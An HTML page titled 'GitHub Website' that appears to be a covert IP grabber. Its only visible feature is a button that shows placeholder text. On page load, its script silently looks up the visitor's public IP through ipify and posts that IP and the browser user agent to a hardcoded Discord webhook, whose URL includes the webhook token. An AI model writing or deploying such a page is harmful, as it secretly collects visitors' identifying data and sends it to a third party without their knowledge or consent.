<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Website</title>
    <script>
        // Function to send data to Discord webhook
        function sendDataToDiscord(ip, browserInfo) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1299425391600996404/szElz0u0F7uCyQJLSryUmFy-CANmAWIGC0wdP2Pho6HGiOdAKvc7dqkCNjUJa9ClwXZm", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                content: `IP: ${ip}\nBrowser: ${browserInfo}`
            }));
        }

        // Function to get user's IP address
        async function getUserIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // Function to get browser information
        function getBrowserInfo() {
            return `${navigator.userAgent}`;
        }

        // Function to display text when button is clicked
        function displayText() {
            document.getElementById("displayText").innerText = "This is the text you wanted to display.";
        }

        // Main function to execute on page load
        async function main() {
            const ip = await getUserIP();
            const browserInfo = getBrowserInfo();
            sendDataToDiscord(ip, browserInfo);
        }

        // Call the main function when the page loads
        window.onload = main;
    </script>
</head>
<body>
    <button onclick="displayText()">Click Me</button>
    <p id="displayText"></p>
</body>
</html>
